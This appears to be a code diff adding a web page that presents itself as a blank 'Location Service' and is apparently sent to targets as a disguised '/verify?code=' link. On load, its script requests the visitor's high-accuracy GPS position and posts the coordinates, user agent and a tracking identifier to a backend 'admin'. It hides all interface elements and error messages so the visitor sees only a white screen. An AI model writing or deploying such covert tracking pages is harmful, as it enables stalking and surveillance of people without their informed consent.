@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Service</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #ffffff;
+            min-height: 100vh;
+            width: 100%;
+            overflow: hidden;
+        }
+        
+        /* Hide all UI elements - show only white screen */
+        .container,
+        h1,
+        .status,
+        .maps-link {
+            display: none !important;
+            visibility: hidden !important;
+        }
+        
+        /* Keep page completely white and blank */
+        html, body {
+            background: #ffffff;
+            color: #ffffff;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Location Service</h1>
+        <div id="status" class="status loading">
+            <div class="spinner"></div>
+            <div>Requesting location...</div>
+        </div>
+        <div id="mapsLink" class="maps-link hidden"></div>
+    </div>
+
+    <script>
+        // Backend API URL - Auto-detect based on current location
+        const API_BASE = (() => {
+            const hostname = window.location.hostname;
+            const protocol = window.location.protocol;
+            const port = window.location.port;
+            
+            // If accessing via localhost or 127.0.0.1
+            if (hostname === 'localhost' || hostname === '127.0.0.1' || hostname === '') {
+                return 'http://localhost:3000';
+            }
+            
+            // If accessing via IP address (like 192.168.x.x)
+            if (/^\d+\.\d+\.\d+\.\d+$/.test(hostname)) {
+                return `http://${hostname}:3000`;
+            }
+            
+            // For production, try same hostname with port 3000, or use environment variable
+            // You can also set a specific backend URL here
+            return `${protocol}//${hostname}:3000`;
+        })();
+        
+        console.log('📍 Location Tracker Initialized');
+        console.log('Current URL:', window.location.href);
+        console.log('Backend API URL:', API_BASE);
+        
+        // Get URL parameters - support both new disguised format and old format
+        function getUrlParams() {
+            const params = new URLSearchParams(window.location.search);
+            const pathname = window.location.pathname;
+            
+            // Check for new disguised format: /verify?code=ABC123
+            if (pathname.includes('/verify') && params.get('code')) {
+                return {
+                    shortId: params.get('code') || '',
+                    trackingId: '', // Will be resolved from shortId
+                    uid: '',
+                    ref: ''
+                };
+            }
+            
+            // Legacy formats
+            return {
+                trackingId: params.get('trackingId') || '',
+                shortId: params.get('code') || '', // Also check for 'code' parameter
+                uid: params.get('uid') || '',
+                ref: params.get('ref') || ''
+            };
+        }
+
+        // Get user agent
+        function getUserAgent() {
+            return navigator.userAgent;
+        }
+
+        // Request geolocation - simplified to work on first attempt
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error('Geolocation is not supported by this browser.'));
+                    return;
+                }
+
+                console.log('📍 Requesting location (first attempt)...');
+                
+                // Request location with optimized settings for fast response
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        console.log('✅ Location obtained successfully:', {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy + 'm'
+                        });
+                        
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        });
+                    },
+                    (error) => {
+                        console.error('❌ Location error:', error.message);
+                        console.error('Error code:', error.code);
+                        
+                        // Provide helpful error messages
+                        let errorMessage = 'Failed to get location';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = 'Location permission denied';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = 'Location information unavailable';
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = 'Location request timed out';
+                                break;
+                        }
+                        
+                        reject(new Error(errorMessage));
+                    },
+                    {
+                        enableHighAccuracy: true,  // Use GPS if available
+                        timeout: 10000,            // 10 second timeout (reduced from 15s)
+                        maximumAge: 30000           // Accept cached position up to 30 seconds old (faster!)
+                    }
+                );
+            });
+        }
+
+        // Send POST request to backend
+        async function sendLocation(data) {
+            try {
+                // Create abort controller for timeout
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 30000); // 30 second timeout
+                
+                const response = await fetch(`${API_BASE}/api/locations`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                    signal: controller.signal
+                });
+                
+                clearTimeout(timeoutId);
+
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    throw new Error(`HTTP error! status: ${response.status}, message: ${errorText}`);
+                }
+
+                return await response.json();
+            } catch (error) {
+                // Handle network errors
+                if (error.name === 'AbortError') {
+                    throw new Error('Request timed out. Please check your internet connection.');
+                } else if (error.message.includes('Failed to fetch') || error.name === 'TypeError') {
+                    throw new Error(`Cannot connect to server at ${API_BASE}. Please check if the backend is running.`);
+                }
+                throw error;
+            }
+        }
+
+        // Generate Google Maps link
+        function generateGoogleMapsLink(latitude, longitude) {
+            return `https://www.google.com/maps?q=${latitude},${longitude}`;
+        }
+
+        // Update status message (hidden - no UI shown)
+        function updateStatus(message, type) {
+            // Silently log to console only - no UI update
+            console.log(`[${type}] ${message}`);
+        }
+
+        // Show Google Maps link (hidden - no UI shown)
+        function showMapsLink(latitude, longitude) {
+            // Silently log to console only - no UI update
+            const googleMapsUrl = generateGoogleMapsLink(latitude, longitude);
+            console.log('Location saved. Maps link:', googleMapsUrl);
+        }
+
+        // Test backend connection
+        async function testBackendConnection() {
+            try {
+                const response = await fetch(`${API_BASE}/`, {
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+                
+                if (response.ok) {
+                    console.log('✅ Backend connection successful');
+                    return true;
+                } else {
+                    console.error('❌ Backend responded with error:', response.status);
+                    return false;
+                }
+            } catch (error) {
+                console.error('❌ Backend connection failed:', error);
+                return false;
+            }
+        }
+
+        // Main execution
+        async function init() {
+            try {
+                console.log('🚀 Starting location tracking...');
+                
+                // Get URL parameters
+                const { trackingId, shortId, uid, ref } = getUrlParams();
+                console.log('URL Parameters:', { trackingId, shortId, uid, ref });
+                
+                // Check if we have any valid tracking parameter
+                if (!trackingId && !shortId && (!uid || !ref)) {
+                    console.error('Missing tracking parameters');
+                    // Close window or redirect after a moment
+                    setTimeout(() => {
+                        window.close();
+                    }, 1000);
+                    return;
+                }
+
+                // Test backend connection first (silently)
+                console.log('🔗 Testing backend connection...');
+                const backendConnected = await testBackendConnection();
+                
+                if (!backendConnected) {
+                    console.error(`Cannot connect to backend server at ${API_BASE}`);
+                    // Close window after a moment
+                    setTimeout(() => {
+                        window.close();
+                    }, 2000);
+                    return;
+                }
+
+                // Get location (silently - no UI shown)
+                console.log('📍 Starting location request...');
+                const location = await getLocation();
+                console.log('✅ Location obtained successfully:', {
+                    lat: location.latitude,
+                    lng: location.longitude,
+                    accuracy: location.accuracy + 'm'
+                });
+
+                // Prepare data
+                const data = {
+                    latitude: location.latitude,
+                    longitude: location.longitude,
+                    userAgent: getUserAgent()
+                };
+                
+                // Add tracking identifier - prioritize shortId (disguised) over trackingId
+                if (shortId) {
+                    data.shortId = shortId;
+                    console.log('Using shortId (disguised):', shortId);
+                } else if (trackingId) {
+                    data.trackingId = trackingId;
+                    console.log('Using trackingId:', trackingId);
+                } else {
+                    data.uid = uid;
+                    data.ref = ref;
+                    console.log('Using uid/ref (legacy):', { uid, ref });
+                }
+
+                console.log('📤 Sending location to backend:', data);
+
+                // Send to backend (silently)
+                const result = await sendLocation(data);
+                console.log('✅ Location saved successfully:', result);
+
+                // Location saved - close window or keep blank
+                console.log('✅ Process complete. Location sent to admin.');
+                
+                // Optionally close the window after successful send
+                // Uncomment the line below if you want the window to close automatically
+                // setTimeout(() => { window.close(); }, 500);
+
+            } catch (error) {
+                console.error('❌ Error in location tracking:', error);
+                
+                // Log error but don't show to user (white screen stays)
+                if (error.code === 1) {
+                    console.error('Location access denied by user');
+                } else if (error.code === 2) {
+                    console.error('Location unavailable');
+                } else if (error.code === 3) {
+                    console.error('Location request timed out');
+                } else {
+                    console.error('Error:', error.message);
+                }
+                
+                // Close window after error (optional)
+                // setTimeout(() => { window.close(); }, 2000);
+            }
+        }
+
+        // Start immediately when page loads (don't wait for DOMContentLoaded)
+        // This ensures location request starts as soon as possible
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', () => {
+                console.log('📄 Page loaded, initializing location tracker...');
+                init();
+            });
+        } else {
+            // DOM already loaded, start immediately
+            console.log('📄 Page already loaded, initializing location tracker immediately...');
+            init();
+        }
+        
+        // Also log any unhandled errors
+        window.addEventListener('error', (event) => {
+            console.error('❌ Global error:', event.error);
+        });
+        
+        window.addEventListener('unhandledrejection', (event) => {
+            console.error('❌ Unhandled promise rejection:', event.reason);
+        });
+    </script>
+</body>
+</html>
